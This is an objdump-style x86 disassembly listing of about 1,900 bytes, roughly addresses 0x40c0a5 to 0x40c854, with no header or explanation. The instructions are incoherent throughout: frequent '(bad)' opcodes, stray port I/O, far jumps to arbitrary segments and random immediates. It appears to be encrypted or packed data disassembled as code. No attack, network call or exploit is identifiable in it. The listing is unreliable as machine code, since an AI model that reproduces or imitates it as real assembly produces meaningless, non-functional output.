  40c0a5:	(bad)  
  40c0a6:	iret   
  40c0a7:	add    DWORD PTR [eax+0x11],ecx
  40c0aa:	xchg   DWORD PTR [eax+0x657956a6],ebx
  40c0b0:	adc    DWORD PTR [ebp-0x31fb65c8],edx
  40c0b6:	test   BYTE PTR [ecx+0x76],0x63
  40c0ba:	int3   
  40c0bb:	into   
  40c0bc:	xchg   esp,eax
  40c0bd:	test   eax,0xcb2a6282
  40c0c2:	dec    edi
  40c0c3:	or     al,0xa
  40c0c5:	and    eax,0x31
  40c0c8:	in     al,dx
  40c0c9:	dec    esi
  40c0ca:	add    eax,0x38054f1c
  40c0cf:	mov    bh,cl
  40c0d1:	sub    BYTE PTR [edi],bh
  40c0d3:	inc    esp
  40c0d4:	mov    ecx,0xfd76c07d
  40c0d9:	push   ss
  40c0da:	dec    esp
  40c0db:	xor    BYTE PTR [eax+0xa],bl
  40c0de:	clc    
  40c0df:	lock fmul DWORD PTR [ebp-0x8]
  40c0e3:	icebp  
  40c0e4:	ja     0x40c084
  40c0e6:	add    al,0x64
  40c0e8:	xor    ah,BYTE PTR [esi]
  40c0ea:	sub    DWORD PTR [edi],ebx
  40c0ec:	sar    BYTE PTR [eax+0xb75636],0x29
  40c0f3:	call   0x2a87:0x157817a
  40c0fa:	push   edi
  40c0fb:	(bad)
  40c0ff:	ror    edx,0x2b
  40c102:	retf   0x3f4c
  40c105:	jecxz  0x40c0e9
  40c107:	mov    al,0x70
  40c109:	xor    edi,DWORD PTR [ecx+edi*1]
  40c10c:	push   cs
  40c10d:	push   esi
  40c10e:	aas    
  40c10f:	xchg   ebp,eax
  40c110:	ret    0x1cd1
  40c113:	cmp    eax,0x7e2cdf1e
  40c118:	int3   
  40c119:	mov    esi,0x72a83fee
  40c11e:	push   cs
  40c11f:	aas    
  40c120:	popf   
  40c121:	mov    eax,ds:0x55c77bbf
  40c126:	add    ch,ch
  40c128:	enter  0x700c,0xab
  40c12c:	bound  eax,QWORD PTR [ebx-0x21fe20e7]
  40c132:	loopne 0x40c185
  40c134:	sub    DWORD PTR [ecx+ecx*4-0xd9fa425],edx
  40c13b:	mov    eax,0xb1fbbbab
  40c140:	sub    DWORD PTR [esi],ebx
  40c142:	mov    bl,0x76
  40c144:	xchg   BYTE PTR [edi+edi*2-0x7c1a3b28],dl
  40c14b:	xor    eax,0xda7f7f09
  40c150:	adc    cl,BYTE PTR [edx]
  40c152:	jae    0x40c156
  40c154:	popa   
  40c155:	in     al,0x99
  40c157:	ds in  al,dx
  40c159:	jmp    0x40c146
  40c15b:	or     cl,ah
  40c15d:	test   al,0x27
  40c15f:	sub    DWORD PTR [esi+0x19],0xd9ac1c8b
  40c166:	add    eax,0xd0f7c0bc
  40c16b:	inc    ebx
  40c16c:	cld    
  40c16d:	add    eax,0xb6accaaf
  40c172:	xor    esp,esp
  40c174:	shl    BYTE PTR ds:0x3ac6fa97,cl
  40c17a:	jge    0x40c141
  40c17c:	leave  
  40c17d:	aaa    
  40c17e:	dec    edi
  40c17f:	das    
  40c180:	and    ecx,DWORD PTR [edx-0x72f11fe9]
  40c186:	mov    esi,0x62384669
  40c18b:	push   ecx
  40c18c:	push   edi
  40c18d:	push   es
  40c18e:	xor    ebp,edx
  40c190:	test   eax,0x9b2f4170
  40c195:	(bad)  
  40c196:	push   edx
  40c197:	or     eax,0x5ced0545
  40c19c:	jmp    0x40c15d
  40c19e:	repz test BYTE PTR [edx+0x55267242],ch
  40c1a5:	jno    0x40c190
  40c1a7:	test   DWORD PTR [esi],edi
  40c1a9:	sahf   
  40c1aa:	add    DWORD PTR [ecx-0x71],0x5c61541f
  40c1b1:	inc    eax
  40c1b2:	jno    0x40c13b
  40c1b4:	xchg   ch,bh
  40c1b6:	cmp    BYTE PTR [edx],dl
  40c1b8:	cmp    DWORD PTR [ecx],esi
  40c1ba:	and    dl,dl
  40c1bc:	int    0x72
  40c1be:	je     0x40c1f6
  40c1c0:	cmc    
  40c1c1:	xchg   ebx,eax
  40c1c2:	fstp   QWORD PTR ds:0x3df3106
  40c1c8:	shr    ecx,1
  40c1ca:	ror    DWORD PTR [edx],0x0
  40c1cd:	add    cl,ch
  40c1cf:	outs   dx,BYTE PTR ds:[esi]
  40c1d0:	add    eax,DWORD PTR [eax]
  40c1d2:	add    BYTE PTR [esi],dl
  40c1d4:	daa    
  40c1d5:	inc    ecx
  40c1d6:	imul   esi,DWORD PTR [ecx+0x69],0xb3b66736
  40c1dd:	xchg   ecx,eax
  40c1de:	popf   
  40c1df:	mov    eax,ds:0x390ac6ae
  40c1e4:	mov    BYTE PTR [esp+edi*2-0x36],bh
  40c1e8:	jns    0x40c266
  40c1ea:	jl     0x40c21f
  40c1ec:	imul   ecx,esp,0x23b617a0
  40c1f2:	jae    0x40c25b
  40c1f4:	aaa    
  40c1f5:	jmp    0x40c25c
  40c1f7:	dec    eax
  40c1f8:	push   eax
  40c1f9:	aas    
  40c1fa:	inc    esi
  40c1fb:	addr16 sbb al,0xcb
  40c1fe:	mov    ebx,0x1227dc34
  40c203:	js     0x40c1d4
  40c205:	mov    dh,0x1d
  40c207:	sbb    bh,dh
  40c209:	dec    eax
  40c20a:	mov    esp,0x219e22e6
  40c20f:	ud0    ebp,DWORD PTR [ecx+0x1e]
  40c213:	test   ebx,ebx
  40c215:	in     eax,0xc0
  40c217:	jbe    0x40c278
  40c219:	sar    BYTE PTR [esi-0x6d206605],0x21
  40c220:	lock cdq 
  40c222:	outs   dx,BYTE PTR ds:[esi]
  40c223:	pop    edi
  40c224:	dec    edi
  40c225:	mov    ecx,0xd3321f8e
  40c22a:	xor    BYTE PTR [esi-0x41],al
  40c22d:	adc    BYTE PTR [ebp-0x52],dl
  40c230:	cmc    
  40c231:	mov    eax,ds:0xc5080196
  40c236:	jle    0x40c1ba
  40c238:	or     bh,BYTE PTR [edx-0x27d8ebe]
  40c23e:	clc    
  40c23f:	and    DWORD PTR [ebp*4-0x6ef847f6],ecx
  40c246:	inc    esi
  40c247:	adc    al,0x54
  40c249:	adc    eax,0x4b867a00
  40c24e:	or     eax,DWORD PTR [edx+eax*1-0x96fcbe0]
  40c255:	icebp  
  40c256:	(bad)  
  40c257:	iret   
  40c258:	push   ebp
  40c259:	pop    ebx
  40c25a:	jo     0x40c23a
  40c25c:	out    dx,eax
  40c25d:	jg     0x40c261
  40c25f:	fistp  WORD PTR [eax]
  40c261:	call   0x2074:0xd38d1cc7
  40c268:	ja     0x40c231
  40c26a:	out    dx,al
  40c26b:	ficomp WORD PTR [eax]
  40c26d:	jg     0x40c2c3
  40c26f:	int3   
  40c270:	mov    eax,ds:0x66371a36
  40c275:	push   edi
  40c276:	jne    0x40c2d0
  40c278:	sbb    DWORD PTR [edx],edi
  40c27a:	pop    DWORD PTR [ebp+0x5953285c]
  40c280:	push   0x60
  40c282:	bound  ebp,QWORD PTR [ebp-0x52]
  40c285:	out    dx,eax
  40c286:	push   edx
  40c287:	shr    DWORD PTR [ebx-0x1],cl
  40c28a:	xor    ch,BYTE PTR [ecx-0x59335095]
  40c290:	imul   edx,DWORD PTR [eax],0x18352f2a
  40c296:	stos   BYTE PTR es:[edi],al
  40c297:	in     eax,0x25
  40c299:	rcr    DWORD PTR [bx+si+0x3b],1
  40c29d:	(bad)
  40c2a2:	mov    cl,0xfb
  40c2a4:	cmp    cl,bl
  40c2a6:	std    
  40c2a7:	cmc    
  40c2a8:	jmp    0x40c273
  40c2aa:	out    dx,al
  40c2ab:	fs loop 0x40c236
  40c2ae:	in     al,0x82
  40c2b0:	sti    
  40c2b1:	adc    edi,ebp
  40c2b3:	push   ecx
  40c2b4:	data16 daa 
  40c2b6:	imul   ecx,DWORD PTR [ecx-0x482e3143],0x50d97ee1
  40c2c0:	cmp    dl,ah
  40c2c2:	sar    DWORD PTR [esi-0x17],1
  40c2c5:	mov    BYTE PTR [ebx+0x2f1f54cd],cl
  40c2cb:	test   al,0xb3
  40c2cd:	mov    ebp,0x4e65184d
  40c2d2:	mov    al,ds:0x9c0e1fac
  40c2d7:	nop
  40c2d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2d9:	(bad)  
  40c2da:	lds    ebx,FWORD PTR [esi-0x40470e14]
  40c2e0:	xor    eax,DWORD PTR [esi]
  40c2e2:	inc    ebp
  40c2e3:	outs   dx,BYTE PTR ds:[esi]
  40c2e4:	jmp    0x40c2ed
  40c2e6:	inc    eax
  40c2e7:	and    esp,DWORD PTR [edx]
  40c2e9:	leave  
  40c2ea:	test   al,0x51
  40c2ec:	jge    0x40c28b
  40c2ee:	sub    DWORD PTR [edi+0x6e],edi
  40c2f1:	adc    DWORD PTR [esi-0x6ae31d82],ebx
  40c2f7:	(bad)  
  40c2f9:	mov    esp,0x5239cef7
  40c2fe:	inc    ebp
  40c2ff:	das    
  40c300:	fldcw  WORD PTR [ecx-0x329e8705]
  40c306:	push   eax
  40c307:	(bad)  
  40c308:	outs   dx,BYTE PTR ds:[esi]
  40c309:	fadd   st,st(3)
  40c30b:	xchg   BYTE PTR [esi-0x4261a75d],cl
  40c311:	(bad)  
  40c312:	or     ch,BYTE PTR [ebx]
  40c314:	out    0x79,al
  40c316:	dec    eax
  40c317:	ret    
  40c318:	jnp    0x40c2be
  40c31a:	mov    bl,0xee
  40c31c:	xchg   ecx,eax
  40c31d:	dec    eax
  40c31e:	cmp    DWORD PTR [edx],esi
  40c320:	lahf   
  40c321:	cs jp  0x40c2ab
  40c324:	xchg   BYTE PTR [edx-0x62170d30],al
  40c32a:	xchg   BYTE PTR ds:0x5a0813af,dh
  40c330:	ret    
  40c331:	push   eax
  40c332:	sbb    ebp,DWORD PTR [edx-0x3b21b6c6]
  40c338:	sub    ch,0x40
  40c33b:	xor    ch,BYTE PTR [ebp+0x7372844d]
  40c341:	or     al,0x17
  40c343:	gs test eax,0xd1cbdca8
  40c349:	leave  
  40c34a:	ror    ecx,0xb6
  40c34d:	xchg   edi,eax
  40c34e:	fnstcw WORD PTR [edx]
  40c350:	iret   
  40c351:	ins    BYTE PTR es:[edi],dx
  40c352:	xchg   BYTE PTR [edx-0x39def96c],bh
  40c358:	pop    ss
  40c359:	cmp    DWORD PTR [edx+0x11],ecx
  40c35c:	idiv   DWORD PTR [ebx+0x25ae694a]
  40c362:	repz mov ebx,0xbb5cf977
  40c368:	jbe    0x40c394
  40c36a:	xchg   edi,eax
  40c36b:	and    eax,0x4ddf0d3c
  40c370:	aad    0x75
  40c372:	(bad)  
  40c373:	aam    0xb9
  40c375:	int3   
  40c376:	cmp    BYTE PTR [esi],0x7f
  40c379:	or     DWORD PTR [ebp+0x58a98be2],eax
  40c37f:	jb     0x40c34a
  40c381:	retf   
  40c382:	sbb    esi,DWORD PTR [ecx-0x70]
  40c385:	jg     0x40c365
  40c387:	mov    dh,BYTE PTR [esi-0x5]
  40c38a:	mov    WORD PTR [ebx+0x15],ss
  40c38d:	sub    esp,eax
  40c38f:	pop    eax
  40c390:	xor    ebx,DWORD PTR [ecx]
  40c392:	(bad)  
  40c393:	ins    DWORD PTR es:[edi],dx
  40c394:	sbb    esp,DWORD PTR [edx]
  40c396:	in     eax,dx
  40c397:	cli    
  40c398:	imul   eax,DWORD PTR [edx],0xcaad3bb4
  40c39e:	cmp    esp,edi
  40c3a0:	(bad)  
  40c3a1:	loopne 0x40c407
  40c3a3:	cmc    
  40c3a4:	xchg   edx,eax
  40c3a5:	ret    0xf14
  40c3a8:	pop    ds
  40c3a9:	mov    edx,0xf655958b
  40c3ae:	lea    eax,[ebx-0x16694f17]
  40c3b4:	and    eax,0xcc492bac
  40c3b9:	ficom  WORD PTR [ebp+0x78]
  40c3bc:	cmp    al,0x11
  40c3be:	gs jle 0x40c3d0
  40c3c1:	imul   esi,DWORD PTR [edx],0xda24a27d
  40c3c7:	push   edi
  40c3c8:	push   0xdf03142d
  40c3cd:	xchg   esi,eax
  40c3ce:	add    BYTE PTR [edi+0x67ff4863],dh
  40c3d4:	sbb    al,0xa
  40c3d6:	aam    0x89
  40c3d8:	sbb    bh,BYTE PTR [ebx-0x77]
  40c3db:	push   0xa902fcda
  40c3e0:	cmp    ebp,eax
  40c3e2:	or     al,0x59
  40c3e4:	push   ds
  40c3e5:	je     0x40c446
  40c3e7:	mov    esp,0x14cca40a
  40c3ec:	fdivr  QWORD PTR [edx]
  40c3ee:	dec    edi
  40c3ef:	(bad)  
  40c3f0:	leave  
  40c3f1:	cdq    
  40c3f2:	xchg   edx,eax
  40c3f3:	cdq    
  40c3f4:	sub    ah,BYTE PTR [edx-0x38698c34]
  40c3fa:	dec    ecx
  40c3fb:	jbe    0x40c3a6
  40c3fd:	cli    
  40c3fe:	js     0x40c450
  40c400:	push   ds
  40c401:	rcl    DWORD PTR [esi+0x466a7237],0x51
  40c408:	push   esp
  40c409:	nop
  40c40a:	sub    ah,ah
  40c40c:	push   ds
  40c40d:	mov    dl,0x6b
  40c40f:	in     al,dx
  40c410:	imul   ebp,ebp,0xffffffbd
  40c413:	xor    eax,0x53ccccf8
  40c418:	xchg   edi,eax
  40c419:	aaa    
  40c41a:	dec    eax
  40c41b:	das    
  40c41c:	inc    edi
  40c41d:	and    DWORD PTR [ecx],edi
  40c41f:	xchg   ebp,eax
  40c420:	test   eax,0xd6f7efc3
  40c425:	sbb    al,0xc8
  40c427:	imul   ebx,DWORD PTR [edx+edi*2],0x84e23ae5
  40c42e:	cmp    al,0x16
  40c430:	or     DWORD PTR [ecx],0x76fc94f9
  40c436:	xor    ebp,DWORD PTR [eax]
  40c438:	ret    0xc23
  40c43b:	push   0x7e86306b
  40c440:	in     eax,dx
  40c441:	mov    dl,0xc6
  40c443:	mov    ds:0x5d1d1259,eax
  40c448:	inc    ecx
  40c449:	stos   DWORD PTR es:[edi],eax
  40c44a:	sub    al,0xdd
  40c44c:	add    eax,0x2e78d114
  40c451:	mov    edx,0x2314c6de
  40c456:	imul   edx,esp,0x8f5c6d46
  40c45c:	xor    eax,0x4037c19f
  40c461:	scas   al,BYTE PTR es:[edi]
  40c462:	jmp    0x40c480
  40c464:	(bad)  
  40c465:	jne    0x40c40f
  40c467:	std    
  40c468:	push   esi
  40c469:	clc    
  40c46a:	in     al,dx
  40c46b:	ja     0x40c47e
  40c46d:	push   ebx
  40c46e:	push   ss
  40c46f:	sahf   
  40c470:	dec    ebx
  40c471:	adc    ah,BYTE PTR [ebx+0x2c]
  40c474:	jbe    0x40c3f6
  40c476:	push   0xca96241f
  40c47b:	aam    0xa5
  40c47d:	fisttp WORD PTR [edx]
  40c47f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c480:	jmp    0x6f83:0x42fdedfb
  40c487:	sub    al,0xc0
  40c489:	or     eax,DWORD PTR [ebp+0x32d40d4b]
  40c48f:	addr16 repnz push 0x16e5d04e
  40c496:	sti    
  40c497:	and    BYTE PTR [ebp-0x2a],al
  40c49a:	push   ds
  40c49b:	dec    esp
  40c49c:	fstp   DWORD PTR ds:0x782a7c44
  40c4a2:	loope  0x40c428
  40c4a4:	jmp    0x40c4c7
  40c4a6:	je     0x40c46c
  40c4a8:	imul   eax,ebx,0x3e
  40c4ab:	pop    edx
  40c4ac:	cmp    BYTE PTR [eax-0x7226b9cc],dh
  40c4b2:	inc    edi
  40c4b3:	mov    esi,0x37a21e9c
  40c4b8:	ds xor esp,ecx
  40c4bb:	leave  
  40c4bc:	and    al,BYTE PTR [esi-0x60]
  40c4bf:	or     DWORD PTR ss:[eax-0x2],edi
  40c4c3:	mov    ds:0x46c9a35,al
  40c4c8:	rcl    edi,0xed
  40c4cb:	aam    0x46
  40c4cd:	cli    
  40c4ce:	sub    bh,ch
  40c4d0:	xor    al,0x1e
  40c4d2:	add    al,0xb
  40c4d4:	mov    eax,0xb7ff7919
  40c4d9:	int    0xa2
  40c4db:	jmp    0x40c4d4
  40c4dd:	out    dx,al
  40c4de:	mov    ecx,0x34f99f9a
  40c4e3:	sub    al,dh
  40c4e5:	neg    DWORD PTR [esp+ebp*4+0x4a]
  40c4e9:	lds    ebx,FWORD PTR [esp+edi*4-0x7f]
  40c4ed:	xor    eax,0x8e925759
  40c4f2:	loopne 0x40c564
  40c4f4:	xlat   BYTE PTR ds:[ebx]
  40c4f5:	out    0xa5,al
  40c4f7:	out    0x4d,al
  40c4f9:	js     0x40c4f9
  40c4fb:	shr    DWORD PTR [ecx+ebp*2+0x7e94f1d],0x1b
  40c503:	xchg   DWORD PTR [ebp+0xe50456b],edx
  40c509:	sahf   
  40c50a:	or     BYTE PTR [edi-0x41dffd62],ah
  40c510:	add    BYTE PTR [edi-0x5cce3e0d],0xc5
  40c517:	fwait
  40c518:	jne    0x40c554
  40c51a:	fucomp st(0)
  40c51c:	jne    0x40c4f3
  40c51e:	ficom  DWORD PTR [ebp+0x4e678e80]
  40c524:	cmp    BYTE PTR [ebx+0x71ad6161],0x5f
  40c52b:	mov    eax,ds:0x8fe73681
  40c530:	inc    ebx
  40c531:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40c533:	test   al,0x2a
  40c535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c536:	je     0x40c54b
  40c538:	xor    eax,0x26b11a92
  40c53d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c53e:	jg     0x40c4c5
  40c540:	(bad)  [ebx-0x2fcc17ab]
  40c546:	add    edx,DWORD PTR [ebp-0x14]
  40c549:	mov    edi,DWORD PTR [ebp-0x1c]
  40c54c:	jmp    0x40c8bf
  40c551:	push   esp
  40c552:	pushf  
  40c553:	scas   al,BYTE PTR es:[edi]
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	jbe    0x40c50c
  40c557:	pop    ebp
  40c558:	arpl   WORD PTR ds:0xa969733d,si
  40c55e:	(bad)  
  40c561:	xchg   edi,eax
  40c562:	xchg   ebp,eax
  40c563:	jl     0x40c5e1
  40c565:	retf   0x7c79
  40c568:	jl     0x40c5a6
  40c56a:	sub    BYTE PTR [ebp+0x1f5cb9e8],0x6e
  40c571:	mov    esp,0x28d7a7d7
  40c576:	inc    edx
  40c577:	dec    eax
  40c578:	sbb    DWORD PTR [ecx],ecx
  40c57a:	imul   edi,DWORD PTR [edx+edx*2-0xe],0x5
  40c57f:	pop    esi
  40c580:	test   eax,0xfe605a2e
  40c585:	xchg   BYTE PTR [edx+0x2f],dl
  40c588:	pop    edi
  40c589:	and    edi,DWORD PTR [edi+0x20]
  40c58c:	add    eax,0x4d278062
  40c591:	adc    ebx,esi
  40c593:	mov    esp,0x5bc41dfa
  40c598:	cmc    
  40c599:	iret   
  40c59a:	ficom  DWORD PTR [ebx]
  40c59c:	imul   ebp,edx,0x44ce8b0c
  40c5a2:	into   
  40c5a3:	xlat   BYTE PTR ds:[ebx]
  40c5a4:	stos   BYTE PTR es:[edi],al
  40c5a5:	iret   
  40c5a6:	xchg   esi,eax
  40c5a7:	xor    ebp,ecx
  40c5a9:	cld    
  40c5aa:	xchg   esp,eax
  40c5ab:	push   ebx
  40c5ac:	push   ss
  40c5ad:	mov    BYTE PTR [ebx],cl
  40c5af:	je     0x40c5a6
  40c5b1:	in     eax,dx
  40c5b2:	sub    BYTE PTR [esi+0x14],0x23
  40c5b6:	lea    ebx,[esi]
  40c5b8:	outs   dx,BYTE PTR ds:[esi]
  40c5b9:	pop    gs
  40c5bb:	ret    
  40c5bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5bd:	stos   DWORD PTR es:[edi],eax
  40c5be:	imul   eax,DWORD PTR [ecx],0x83adf0af
  40c5c4:	popa   
  40c5c5:	inc    edx
  40c5c6:	jnp    0x40c59b
  40c5c8:	repz retf 
  40c5ca:	dec    ebp
  40c5cb:	inc    ebx
  40c5cc:	jp     0x40c5b9
  40c5ce:	mov    DWORD PTR [eax],edi
  40c5d0:	pop    es
  40c5d1:	pop    ebp
  40c5d2:	xchg   edi,eax
  40c5d3:	cmp    DWORD PTR [ecx+0x3a106c4b],esi
  40c5d9:	mov    ch,0xf0
  40c5db:	cmp    al,dl
  40c5dd:	lds    ebx,FWORD PTR [ebx-0x68]
  40c5e0:	adc    dh,BYTE PTR [eax-0x55f4b8b6]
  40c5e6:	add    dh,ah
  40c5e8:	in     eax,dx
  40c5e9:	adc    eax,0x6796ee68
  40c5ee:	mov    al,ds:0x54632821
  40c5f3:	pushf  
  40c5f4:	stos   DWORD PTR es:[edi],eax
  40c5f5:	ja     0x40c60a
  40c5f7:	sub    DWORD PTR [eax],edx
  40c5f9:	adc    ah,ch
  40c5fb:	mov    bl,0xbd
  40c5fd:	push   esp
  40c5fe:	jp     0x40c637
  40c600:	daa    
  40c601:	mov    eax,ds:0xfa055462
  40c606:	jg     0x40c5ee
  40c608:	xlat   BYTE PTR ds:[ebx]
  40c609:	push   0xa57b41ae
  40c60e:	adc    dl,BYTE PTR [edi]
  40c610:	xor    eax,0x910d0aad
  40c615:	push   edx
  40c616:	and    eax,0x1858cc8
  40c61b:	push   ss
  40c61c:	jmp    0x96e52a54
  40c621:	mov    edx,0xcd68f216
  40c626:	mov    dl,0x7
  40c628:	iret   
  40c629:	inc    edi
  40c62a:	aaa    
  40c62b:	in     eax,dx
  40c62c:	sub    DWORD PTR [ebp-0x30],0xef3e409d
  40c633:	jmp    0x40c5de
  40c635:	(bad)  
  40c636:	je     0x40c683
  40c638:	rol    BYTE PTR [edi],cl
  40c63a:	imul   esi,DWORD PTR [edi],0x71
  40c63d:	push   ecx
  40c63e:	sub    DWORD PTR [esi],esp
  40c640:	out    0xd6,al
  40c642:	and    al,BYTE PTR gs:[ebx-0x422001a5]
  40c649:	jp     0x40c5f7
  40c64b:	mov    dl,0x39
  40c64d:	mov    esp,0x6d333d93
  40c652:	out    0xbe,al
  40c654:	fdiv   DWORD PTR ss:[ebp+0x74899c82]
  40c65b:	(bad)  
  40c65c:	xor    BYTE PTR [esi],bl
  40c65e:	and    eax,0xcbec704b
  40c663:	out    dx,al
  40c664:	xor    eax,0xa3347b8c
  40c669:	stos   BYTE PTR es:[edi],al
  40c66a:	push   edx
  40c66b:	sub    al,0xa4
  40c66d:	cmp    DWORD PTR [edi],0xc07404ec
  40c673:	iret   
  40c674:	out    dx,eax
  40c675:	test   DWORD PTR [edx+0x78],esp
  40c678:	push   ecx
  40c679:	mov    edi,0x46eec713
  40c67e:	sub    al,0x3a
  40c680:	mov    ecx,0xe165387a
  40c685:	push   eax
  40c686:	jle    0x40c63d
  40c688:	aad    0xbc
  40c68a:	retf   
  40c68b:	out    dx,al
  40c68c:	jp     0x40c648
  40c68e:	idiv   DWORD PTR [edi-0x2839aa96]
  40c694:	jmp    0xe4be4740
  40c699:	in     al,0x65
  40c69b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c69c:	pop    es
  40c69d:	aas    
  40c69e:	dec    eax
  40c69f:	xchg   edi,eax
  40c6a0:	inc    edi
  40c6a1:	ret    
  40c6a2:	jl     0x40c640
  40c6a4:	icebp  
  40c6a5:	or     DWORD PTR [esi],esi
  40c6a7:	mov    ds:0x1b69c925,al
  40c6ac:	jns    0x40c647
  40c6ae:	daa    
  40c6af:	shl    ebp,0x2f
  40c6b2:	sbb    eax,0xccce583d
  40c6b7:	or     al,BYTE PTR [ebx-0x56c78e59]
  40c6bd:	xchg   ebp,eax
  40c6be:	sbb    BYTE PTR [edx],bl
  40c6c0:	cwde   
  40c6c1:	pop    ss
  40c6c2:	jo     0x40c69e
  40c6c4:	fs call 0xa97c:0x13f3b51c
  40c6cc:	stc    
  40c6cd:	retf   0xee4b
  40c6d0:	mov    eax,ds:0x6a318859
  40c6d5:	loop   0x40c748
  40c6d7:	int    0x47
  40c6d9:	push   ebp
  40c6da:	test   eax,0x41901c6b
  40c6df:	out    dx,al
  40c6e0:	fmulp  st(7),st
  40c6e2:	adc    BYTE PTR [eax+0x7b966df0],0xc2
  40c6e9:	sub    dl,BYTE PTR [edi-0x6a767ada]
  40c6ef:	mov    esp,edx
  40c6f1:	sub    al,0x2
  40c6f3:	sbb    DWORD PTR [esi+0x45],esp
  40c6f6:	push   ss
  40c6f7:	ror    BYTE PTR [ecx+0x3e],1
  40c6fa:	mov    ds:0x234923b6,eax
  40c6ff:	std    
  40c700:	sbb    al,0xed
  40c702:	icebp  
  40c703:	sbb    eax,0x1fb0a3f0
  40c708:	jno    0x40c6e0
  40c70a:	mov    bl,0xfb
  40c70c:	jl     0x40c6f4
  40c70e:	cs fwait
  40c710:	stos   DWORD PTR es:[edi],eax
  40c711:	inc    ebp
  40c712:	push   eax
  40c713:	xchg   esi,eax
  40c714:	inc    eax
  40c715:	js     0x40c6c4
  40c717:	dec    ebp
  40c718:	out    dx,al
  40c719:	cmc    
  40c71a:	xor    al,0xf5
  40c71c:	or     ecx,ecx
  40c71e:	push   eax
  40c71f:	mov    edx,0xbb88dc78
  40c724:	pop    ecx
  40c725:	cdq    
  40c726:	jae    0x40c717
  40c728:	jg     0x40c70e
  40c72a:	sbb    dl,BYTE PTR [edx-0x6a]
  40c72d:	inc    edi
  40c72e:	jo     0x40c762
  40c730:	xor    al,0xe6
  40c732:	inc    esi
  40c733:	add    al,0x3c
  40c735:	fsubr  QWORD PTR [ebp+0x3]
  40c738:	aam    0x9f
  40c73a:	add    DWORD PTR [edx],ebx
  40c73c:	adc    DWORD PTR [edi+ebp*1+0x52d7d338],esi
  40c743:	int    0x46
  40c745:	jl     0x40c741
  40c747:	mov    esp,ebp
  40c749:	xchg   edi,eax
  40c74a:	push   eax
  40c74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c74c:	mov    ch,0xd
  40c74e:	mov    ?,WORD PTR [edx]
  40c750:	test   al,0xa0
  40c752:	in     al,dx
  40c753:	retf   0x26ea
  40c756:	in     al,0x92
  40c758:	cmp    bh,BYTE PTR [ebx+0x68ee6f88]
  40c75e:	sbb    eax,DWORD PTR [ecx+eax*1]
  40c761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c762:	mov    al,0x31
  40c764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c765:	test   BYTE PTR [edx-0x49],bh
  40c768:	jge    0x40c73c
  40c76a:	js     0x40c700
  40c76c:	shl    DWORD PTR [eax-0xc2ce330],0xaf
  40c773:	and    ah,cl
  40c775:	jne    0x40c75f
  40c777:	lahf   
  40c778:	sti    
  40c779:	or     ch,BYTE PTR [edi+0x21]
  40c77c:	jno    0x40c76c
  40c77e:	push   esi
  40c77f:	clc    
  40c780:	jg     0x40c778
  40c782:	jg     0x40c746
  40c784:	in     eax,0xa5
  40c786:	xchg   BYTE PTR [esi+edi*4],cl
  40c789:	jmp    0xccc9:0x5ad73c8c
  40c790:	jnp    0x40c755
  40c792:	xor    eax,0x4211791c
  40c797:	mov    BYTE PTR [edi+ecx*8-0xf920d89],bl
  40c79e:	cmc    
  40c79f:	xchg   edi,eax
  40c7a0:	mov    al,ds:0x4d06d56d
  40c7a5:	mov    BYTE PTR [ebx-0x945fc51],dh
  40c7ab:	clc    
  40c7ac:	jns    0x40c826
  40c7ae:	lods   al,BYTE PTR ds:[esi]
  40c7af:	in     eax,0x9f
  40c7b1:	inc    ecx
  40c7b2:	nop
  40c7b3:	fld    st(1)
  40c7b5:	leave  
  40c7b6:	jmp    0x40c73f
  40c7b8:	xchg   edi,eax
  40c7b9:	aad    0xf0
  40c7bb:	fwait
  40c7bc:	mov    esi,esp
  40c7be:	add    BYTE PTR [ecx+0xf],bh
  40c7c1:	push   eax
  40c7c2:	mov    esi,0xbdd5a2f
  40c7c7:	dec    esi
  40c7c8:	fsubr  QWORD PTR [eax+0x4e]
  40c7cb:	sbb    DWORD PTR [edi],edx
  40c7cd:	mov    DWORD PTR [ecx-0x390f66e5],ecx
  40c7d3:	mov    dl,0x59
  40c7d5:	mov    dl,0xa0
  40c7d7:	and    DWORD PTR [ebp+0x8adebe6],eax
  40c7dd:	xchg   esp,eax
  40c7de:	lock scas eax,DWORD PTR es:[edi]
  40c7e0:	cwde   
  40c7e1:	lahf   
  40c7e2:	lods   al,BYTE PTR ds:[esi]
  40c7e3:	in     eax,0x6a
  40c7e5:	lds    ebx,FWORD PTR [ebx-0x52]
  40c7e8:	jae    0x40c853
  40c7ea:	mov    ch,BYTE PTR [edx-0x60]
  40c7ed:	mov    eax,ds:0x9a29dbc4
  40c7f2:	mov    eax,ds:0x18670520
  40c7f7:	hlt    
  40c7f8:	pop    ds
  40c7f9:	aad    0xac
  40c7fb:	sub    ebx,0xffffffcb
  40c7fe:	fdivp  st(7),st
  40c800:	mov    dl,0x32
  40c802:	clc    
  40c803:	in     eax,dx
  40c804:	rcl    DWORD PTR [edx-0x6248e297],1
  40c80a:	inc    esi
  40c80b:	push   esp
  40c80c:	push   ss
  40c80d:	xor    eax,0xe8a9266c
  40c812:	cdq    
  40c813:	(bad)  
  40c814:	outs   dx,BYTE PTR ds:[esi]
  40c815:	cdq    
  40c816:	xor    ebp,DWORD PTR [ebx-0x18f4ea22]
  40c81c:	inc    esp
  40c81d:	je     0x40c7f5
  40c81f:	pop    ds
  40c820:	imul   ecx,DWORD PTR [si+0xa],0x4a12fac9
  40c828:	xchg   edi,eax
  40c829:	popf   
  40c82a:	lods   al,BYTE PTR ds:[esi]
  40c82b:	jp     0x40c888
  40c82d:	mov    eax,ds:0x71839946
  40c833:	mov    cl,0x28
  40c835:	mov    edi,0x1a8562c9
  40c83a:	jnp    0x40c88d
  40c83c:	sub    eax,0xf453df81
  40c841:	mov    ds:0x11901ccc,eax
  40c846:	popf   
  40c847:	inc    edi
  40c848:	mov    edi,0x9efae520
  40c84d:	inc    edx
  40c84e:	and    DWORD PTR [eax-0x43951378],ebp
  40c854:	das    
